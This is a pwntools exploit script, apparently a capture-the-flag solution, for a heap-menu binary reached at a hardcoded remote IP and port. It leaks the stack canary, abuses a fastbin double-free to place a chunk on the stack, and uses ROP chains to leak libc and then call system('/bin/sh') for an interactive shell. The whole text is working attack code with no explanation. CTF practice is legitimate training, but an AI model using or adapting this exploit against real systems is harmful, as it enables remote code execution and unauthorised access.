from pwn import *

#context.log_level="debug"
def menu(choice):
	p.recvuntil(':\n')
	p.sendline(str(choice))
def add(idx,content):
    menu(1)
    p.recvuntil('id:')
    p.sendline(str(idx))
    p.recvuntil('content')
    p.send(content)

def delete(idx):
     menu(2)
     p.recvuntil('id:')
     p.sendline(str(idx))

def edit(data):
	menu(3)
	p.send(data)
t = ELF('./main')
p=remote("183.129.189.61",54604)
p.sendlineafter(": ","ylg")
p.recvuntil("tag: ")
stack=int(p.recvuntil(":",drop=True),16)
print hex(stack)
p.recvuntil('choice:')
p.sendline('2')

edit('y'*0x19)
p.recvuntil('y'*0x19)
canary=u64("\x00"+p.recv(7))
print hex(canary)

edit(p64(0)+p64(0x71) + '\0'*0x10)

add(1,"ylg")
add(2,"ylg")
delete(1)
delete(2)
delete(1)
pop_rdi = 0x400d23
add(3,p64(stack-0x40))
add(4,"ylg")
add(5,"ylg")
add(6,"b"*8+p64(canary)+p64(0)+p64(pop_rdi)+p64(t.got['free'])+p64(t.plt['puts']) +p64(0x400750))
menu(4)
libc=u64(p.recv(6)+"\x00\x00")- 0x84540
system = libc + 0x453a0
binsh_libc = libc + 0x000000000018ce17
print hex(libc)
p.sendlineafter(": ","ylg")
p.recvuntil("tag: ")
stack=int(p.recvuntil(":",drop=True),16)
print hex(stack)

p.recvuntil('choice:')
p.sendline('2')

delete(1)
delete(2)
delete(1)


mhook = libc + 0x3c4b10
og = libc + 0x4527a
realloc = libc + 0x84710
edit(p64(0)+p64(0x71) + '\0'*0x10)
add(7,p64(stack-0x40))
add(8,"ylg")
add(9,"ylg")
add(10,"b"*8+p64(canary) + p64(0) + p64(pop_rdi) + p64(binsh_libc) + p64(system))
menu(4)
p.interactive()
